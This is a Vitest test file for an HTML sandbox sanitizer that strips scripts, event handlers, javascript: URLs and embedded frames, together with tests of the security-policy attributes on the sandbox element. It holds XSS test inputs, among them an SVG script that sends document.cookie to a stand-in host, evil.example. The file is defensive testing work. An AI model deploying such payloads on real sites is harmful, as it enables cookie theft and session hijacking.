import { describe, it, expect } from 'vitest';
import type { ResolvedSecurityPolicy } from '@refrakt-md/types';
import { sanitizeSandboxContent } from '../src/index.js';
import { parse, findTag } from './helpers.js';

const trusted: ResolvedSecurityPolicy = { trust: 'trusted', allowJs: true, sandboxOrigin: undefined };
const strict: ResolvedSecurityPolicy = { trust: 'untrusted', allowJs: false, sandboxOrigin: undefined };
const allowJs: ResolvedSecurityPolicy = { trust: 'untrusted', allowJs: true, sandboxOrigin: undefined };
const tier3: ResolvedSecurityPolicy = { trust: 'untrusted', allowJs: false, sandboxOrigin: 'https://sandbox.example.com' };

describe('sanitizeSandboxContent', () => {
	it('returns input unchanged when policy is trusted', () => {
		const input = '<div>hi</div><script>alert(1)</script>';
		expect(sanitizeSandboxContent(input, trusted)).toBe(input);
	});

	it('returns input unchanged when allowJs is true', () => {
		const input = '<div>hi</div><script>alert(1)</script>';
		expect(sanitizeSandboxContent(input, allowJs)).toBe(input);
	});

	it('strips <script> blocks in strict mode', () => {
		const input = '<div>kept</div><script>alert(1)</script><p>still kept</p>';
		const out = sanitizeSandboxContent(input, strict);
		expect(out).not.toContain('<script');
		expect(out).not.toContain('alert(1)');
		expect(out).toContain('<div>kept</div>');
		expect(out).toContain('<p>still kept</p>');
	});

	it('strips multiline <script> blocks', () => {
		const input = '<div>before</div>\n<script>\n  var x = 1;\n  console.log(x);\n</script>\n<p>after</p>';
		const out = sanitizeSandboxContent(input, strict);
		expect(out).not.toContain('console.log');
		expect(out).toContain('<div>before</div>');
		expect(out).toContain('<p>after</p>');
	});

	it('strips on*-prefixed event handler attributes', () => {
		const cases = [
			['<button onclick="evil()">x</button>', '<button>x</button>'],
			["<img src=\"a.jpg\" onerror='evil()'>", '<img src="a.jpg">'],
			['<a href="#" onmouseover=evil>x</a>', '<a href="#">x</a>'],
		];
		for (const [input, expected] of cases) {
			expect(sanitizeSandboxContent(input, strict)).toBe(expected);
		}
	});

	it('strips javascript: URLs from href/src/action', () => {
		const input = '<a href="javascript:alert(1)">x</a><img src="javascript:evil()"><form action="javascript:bad()">';
		const out = sanitizeSandboxContent(input, strict);
		expect(out).not.toContain('javascript:');
	});

	it('strips dangerous tags (iframe, object, embed)', () => {
		const input = '<iframe src="https://evil.example"></iframe><object data="x"></object><embed src="y">';
		const out = sanitizeSandboxContent(input, strict);
		expect(out).not.toContain('<iframe');
		expect(out).not.toContain('<object');
		expect(out).not.toContain('<embed');
	});

	it('strips scripts inside SVG content', () => {
		const input = '<svg><circle r="10"/><script>fetch("//evil.example?"+document.cookie)</script></svg>';
		const out = sanitizeSandboxContent(input, strict);
		expect(out).not.toContain('<script');
		expect(out).not.toContain('fetch');
		expect(out).toContain('<circle');
	});
});

describe('sandbox rune — security policy meta tags', () => {
	const policyVar = (p: ResolvedSecurityPolicy) => ({ __securityPolicy: p });

	// SPEC-081: the policy now rides the rf-sandbox element's data-* attributes.
	it('emits data-security-mode=trusted by default (no policy variable)', () => {
		const result = parse(`{% sandbox %}\n<div>hi</div>\n{% /sandbox %}`);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		expect(sandbox!.attributes['data-security-mode']).toBe('trusted');
		expect(sandbox!.attributes['data-allow-js']).toBe('true');
	});

	it('emits data-security-mode=untrusted and data-allow-js=false in strict mode', () => {
		const result = parse(
			`{% sandbox %}\n<div>hi</div><script>evil()</script>\n{% /sandbox %}`,
			policyVar(strict),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		expect(sandbox!.attributes['data-security-mode']).toBe('untrusted');
		expect(sandbox!.attributes['data-allow-js']).toBe('false');
	});

	it('sanitises data-source-content in strict mode', () => {
		const result = parse(
			`{% sandbox %}\n<div data-source="HTML"><button onclick="evil()">x</button></div>\n<script data-source="JavaScript">alert(1)</script>\n{% /sandbox %}`,
			policyVar(strict),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		const content = sandbox!.attributes['data-source-content'] as string;
		// Sanitised: scripts and on-handlers gone
		expect(content).not.toContain('<script');
		expect(content).not.toContain('onclick');
		expect(content).not.toContain('alert(1)');
		// HTML structure kept
		expect(content).toContain('<button');
	});

	it('preserves content unchanged in trusted mode', () => {
		const result = parse(
			`{% sandbox %}\n<button onclick="ok()">x</button><script>console.log(1)</script>\n{% /sandbox %}`,
			policyVar(trusted),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		const content = sandbox!.attributes['data-source-content'] as string;
		expect(content).toContain('onclick');
		expect(content).toContain('<script>');
		expect(content).toContain('console.log(1)');
	});

	it('preserves content in untrusted+allowJs mode (Tier 2 — JS allowed, iframe hardened by client)', () => {
		const result = parse(
			`{% sandbox %}\n<button onclick="ok()">x</button>\n{% /sandbox %}`,
			policyVar(allowJs),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		// allowJs=true means content passes through; client-side meta-CSP +
		// dropped allow-same-origin do the work.
		expect(sandbox!.attributes['data-source-content']).toContain('onclick');
		expect(sandbox!.attributes['data-allow-js']).toBe('true');
	});

	it('emits data-sandbox-origin when policy specifies one (Tier 3)', () => {
		const result = parse(
			`{% sandbox %}\n<div>x</div>\n{% /sandbox %}`,
			policyVar(tier3),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		expect(sandbox!.attributes['data-sandbox-origin']).toBe('https://sandbox.example.com');
	});

	it('does not emit data-sandbox-origin when origin is unset', () => {
		const result = parse(
			`{% sandbox %}\n<div>x</div>\n{% /sandbox %}`,
			policyVar(strict),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		expect(sandbox!.attributes['data-sandbox-origin']).toBeUndefined();
	});

	it('SSR fallback pre uses the sanitised content in strict mode', () => {
		const result = parse(
			`{% sandbox %}\n<div>kept</div><script>evil()</script>\n{% /sandbox %}`,
			policyVar(strict),
		);
		const sandbox = findTag(result as any, t => t.attributes['data-rune'] === 'sandbox');
		const pre = findTag(sandbox!, t => t.name === 'pre');
		expect(pre).toBeDefined();
		const codeText = JSON.stringify(pre!.children);
		expect(codeText).not.toContain('evil()');
		expect(codeText).toContain('kept');
	});
});
